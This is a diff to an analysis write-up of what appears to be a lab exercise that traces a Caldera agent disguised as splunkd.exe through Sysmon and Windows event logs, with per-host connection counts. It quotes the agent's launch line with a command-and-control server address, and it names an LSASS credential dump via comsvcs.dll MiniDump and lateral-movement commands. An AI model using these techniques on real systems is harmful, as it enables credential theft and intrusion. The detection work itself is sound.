@@ -6,9 +6,10 @@
 `C:\Users\Public\splunkd.exe` is the Caldera (Sandcat) agent, and the attack commands are its descendants. Nothing in the data contradicts this.
 - **Server and port.** Every Sysmon 3 from `splunkd.exe` that is not mDNS (5353) goes to `192.168.50.50:8888`. The 4688 launch line reads `"C:\Users\Public\splunkd.exe" -server http://192.168.50.50:8888 -group red|foothold|pivot_adm…`, parent `svchost.exe` (scheduled task, Option D).
 - **Children.** Sysmon 1 with `parent_image` ending `splunkd.exe` are `powershell.exe` commands. The attack commands (`rundll32 … comsvcs.dll MiniDump`, `net use`, `sc.exe \\<ip>`, `Invoke-Command`) are grandchildren of splunkd through that `powershell.exe`.
-- **Accounts.** Sysmon 1/3 show the user token (svc_backup, admin_it, svc_sql, or `system` for the legacy agent). 4688 `subject_account` is `lab\endpoint-0N$` for the splunkd launch lines (the SCM starts the task); use Sysmon `account_name` as the agent identity, not 4688 `subject_account`.
+- **Accounts.** Sysmon 1/3 show the user token (svc_backup, admin_it, `system` for the legacy ep-02 agent; svc_sql appears in the DB only as credentials in command lines, not as an agent token). 4688 `subject_account` is `lab\endpoint-0N$` for the splunkd launch lines (Task Scheduler (svchost) starts the task); use Sysmon `account_name` as the agent identity, not 4688 `subject_account`.
 
-## Counts (Sysmon 3, splunkd → 192.168.50.50:8888, per host)
+## Counts (Sysmon 3, splunkd → 192.168.50.50:8888, per host, ALL DATES in the DB)
+Negative check: in every development DB the only destination ports of splunkd Sysmon 3 are 5353 (mDNS) and 8888 (s02 14/4, s03 159/16, s04 24/4, s05 197/19, s06 181/20, s07 33/12 rows of 5353/8888). ep-03 has no agent in the handoff §19.2 table; its splunkd rows (s03, s05, s06) are dated 2026-09-11…22 (parent powershell.exe/svchost), before the trial, and are excluded by the run-day rule.
 | Trial | ep-01 | ep-02 | ep-03 |
 |---|---|---|---|
 | s02 | 3 | 1 | 0 |
